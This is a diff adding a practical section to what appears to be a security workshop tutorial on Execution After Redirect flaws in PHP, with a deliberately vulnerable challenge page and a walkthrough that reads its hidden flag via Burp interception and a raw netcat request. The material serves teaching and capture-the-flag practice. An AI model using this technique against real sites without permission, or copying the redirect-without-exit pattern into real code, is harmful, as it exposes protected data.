@@ -529,13 +529,104 @@ if (!$current_user ->is_admin())
 echo "Sensitive Information";
 ```
 
-In this example, this simple application simply check if the user is admin or not. If it is not, the user will get redirected away via "header()". Else, the page will just continue loading. 
+In this example, this simple web application simply check if the user is admin or not. If it is not, the user will get redirected away via "Location". Else, the page will just continue loading on the web browser. 
 
-EAR is a logic flaw that arises when a web application developer misunderstood the sematics of redirection. The typical belief is that the web application will halt its processing after the web application perform a redirection. In this above example, the common misunderstanding is that the echo "Sensitive Information" will not be executed if the user is not admin. 
+So when the browser query the page, the following http header will be received by the browser. when the browser saw Location: new-old.php, it will immediately redirect itself to some-page.php 
+
+```
+HTTP/1.1 302 Found
+Date: Fri, 21 Aug 2015 14:31:52 GMT
+Server: Apache/2.4.16 (Unix) OpenSSL/1.0.1p PHP/5.6.11 mod_perl/2.0.8-dev Perl/v5.16.3
+X-Powered-By: PHP/5.6.11
+Location: some-page.php
+Content-Length: 73
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+```
+
+EAR is a logic flaw that arises when a web application developer misunderstood the sematics of redirection. The typical belief is that the web application will halt its processing after the web application perform a redirection. In this above example, the common misunderstanding is that the echo "Sensitive Information" will not be executed if the user is not admin. So in some sense, this is a mismatch between the intention of the web developer and browser behavior. 
 
 This may not be true. Some framework and languages executes all the rest of the operation after the redirection operation. The browser simply perpetuates this understanding by simply obediently performing the rediredion when it saw "header". To the web developer and also normal user, it seems like the following lines after the redirection is not executed. 
 
 However, what if you have "something" that don't obey the redirect operation? 
 
-
 Credit: http://cs.ucsb.edu/~bboe/public/pubs/fear-the-ear-ccs2011.pdf
+
+### Practical: Fear the EAR
+In this challenge, you are given a url http://web.nusgreyhats.org/ear/old-new.php. When the browser access the page, it get redirected to http://web.nusgreyhats.org/ear/new-old.php. No matter how you visit the page, it always get redirected. Let's take a look at the source code of old-new.php
+
+```php
+<?php 
+		$redirect_url = 'new-old.php';
+		header("Location: " . $redirect_url); 
+?>
+
+<div>
+	<center>
+		<?php echo "The flag is [redacted]]" ?> 
+	</center>
+</div>
+```
+
+Aha. It seems like we can try out Execution After Redirect attack. To do that we will need a stop the redirection from occuring. In this workshop, we will be use Burp proxy (https://portswigger.net/burp/) to aid us with the challenge. Burp proxy is an intercepting proxy. So by pointing our browser at Burp proxy, Burp will be able to intercept all the web traffic. This allows us to analysis and even modify the content of the web traffic. So let's try to capture web traffic. 
+
+
+The following web header shows us that we are trying to get the web page /ear/old-new.php from the web server. We shall allow this to go through by forwarding it to the web server. 
+
+```
+GET /ear/old-new.php HTTP/1.0
+Host: web.nusgreyhats.org
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://web.nusgreyhats.org/ear/
+Connection: keep-alive
+```
+
+At this point, the server respond with the following. The web header is similar to what we have discuss previously. 
+
+```
+HTTP/1.1 302 Found
+Date: Fri, 21 Aug 2015 14:55:34 GMT
+Server: Apache/2.4.16 (Unix) OpenSSL/1.0.1p PHP/5.6.11 mod_perl/2.0.8-dev Perl/v5.16.3
+X-Powered-By: PHP/5.6.11
+Location: new-old.php
+Content-Length: 73
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+
+<div>
+	<center>
+		The flag is [redacted] 
+	</center>
+</div>
+```
+
+So at this point you already gotten the flag, but let's leave that aside. What else can we do to prevent the redirection? Remove the "Location"? Or prehap use something that does not follow redirection. There is many way to go about it. We will briefly cover two possible way. 
+
+The easiest is to remove "Location: new-old.php" from the header before forwarding it the web browser. This can be done easily via Burp. 
+
+Let's explore the second way. Let's try to use netcat. Let's connect to the server. 
+```
+nc web.nusgreyhats.org 80
+```
+
+We then try to get old-new.php
+```
+GET /ear/old-new.php
+```
+
+And then ... 
+```
+<div>
+        <center>
+                The flag is [redacted]
+        </center>
+</div>   
+```
+
+
